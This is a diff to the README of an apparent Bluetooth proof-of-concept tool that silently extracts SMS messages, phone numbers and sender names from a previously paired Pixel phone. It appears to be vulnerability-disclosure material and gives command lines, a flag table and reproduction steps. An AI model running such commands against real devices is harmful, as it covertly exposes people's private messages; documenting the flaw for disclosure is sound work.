@@ -82,7 +82,7 @@ user must allow message access, after which text-message data is extracted):
 > **Note:** Sometimes this command fails to output the XML data. If so, run:
 
 ```bash
-stdbuf -i0 -o0 -e0 ./target/release/obex-map-get [PIXEL_MAC] [MAP_CH] --repeat=1 --preview-body=5000 --out-dir=evidence
+stdbuf -i0 -o0 -e0 ./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=5000 --output=evidence.bin
 ```
 
 After pairing, disconnect the computer from the phone:
@@ -93,14 +93,48 @@ Settings -> Connected devices -> Select paired computer -> Disconnect
 
 Run the command again without the connection. The exfiltration of a text
 message, phone number, and sender name prints to the terminal with no
-notification, pop-up, or other indication on the phone. The phone does not need to be connected via bluetooth after the initial pairing in order for the data exfiltration to occur in the future.:
+notification, pop-up, or other indication on the phone. The phone does not need to be connected via bluetooth after the initial pairing in order for the data exfiltration to occur in the future:
 
 ```bash
-./target/release/obex-map-get [PIXEL_MAC] [MAP CHANNEL] --repeat=1 --preview-body=512
+./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
 ```
-To test for the unexpected state transition during the extraction of information, follow these steps:
+## Flag reference
 
-With the phone plugged in via usb and usb debugging enabled, we now execute the following command.: 
+`./target/release/obex-map-get --help` prints the built-in list. The flags:
+
+| Flag | Default | Purpose |
+|------|---------|---------|
+| `--repeat=N` | 1 | Number of CONNECT/GET probe runs |
+| `--sleep-ms=M` | 0 | Pause between runs (milliseconds) |
+| `--timeout-s=N` | 5 | RFCOMM socket timeout in seconds |
+| `--warmup` | off | Perform one discarded warm-up run |
+| `--preview-body=N` | 0 | Include the first N bytes of the message body in the output |
+| `--json` | off | Emit machine-readable JSON (runs + summary) |
+| `--no-stdout-json` | off | Suppress JSON on stdout (file is still written with `--out-dir`) |
+| `--csv=FILE` | — | Write telemetry CSV to FILE |
+| `--append` | off | Append to the CSV instead of overwriting |
+| `--output=FILE` | — | Save the raw message-listing body of the first successful run to FILE |
+| `--out-dir=DIR` | — | Auto-save timestamped CSV/JSON files to DIR |
+| `--out-prefix=P` | mapget | Filename prefix for auto-saved files |
+| `--redact` | off | Mask codes/errors and zero the body preview (for shareable output) |
+
+Examples:
+
+```bash
+# Collect 10 runs, 2 seconds apart, saving redacted evidence files
+./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=10 --sleep-ms=2000 --out-dir=evidence --redact
+
+# Machine-readable single run for scripting
+./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --json
+```
+
+---
+
+## Unexpected state transition
+
+To test for the state transition during extraction, follow these steps:
+
+With the phone plugged in via usb and usb debugging enabled, we now execute the following command:
 
 ```
 adb logcat -v time | grep -E "BluetoothMapObexServer|UserManagerService" 
@@ -110,7 +144,7 @@ This will enable logging of system messages from the android device
 Next we must execute: 
 
 ```
-./target/release/obex-map-get [PIXEL_MAC] [MAP CHANNEL] --repeat=1 --preview-body=512
+./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
 ```
 Our next move is to execute
 
@@ -131,8 +165,8 @@ To understand this, we must examine the following states found in BluetoothProfi
 
 1. STATE_DISCONNECTED = 0 
 2. STATE_CONNECTING = 1 (This is where security checks take place) 
-3. STATE CONNECTED = 2 (This means data is now flowing) 
-4. STATE DISCONNECTING = 3
+3. STATE_CONNECTED = 2 (This means data is now flowing) 
+4. STATE_DISCONNECTING = 3
 
 See here for reference to these states in android google source code. https://android.googlesource.com/platform/frameworks/base/+/010bf37/core/java/android/bluetooth/BluetoothProfile.java
 
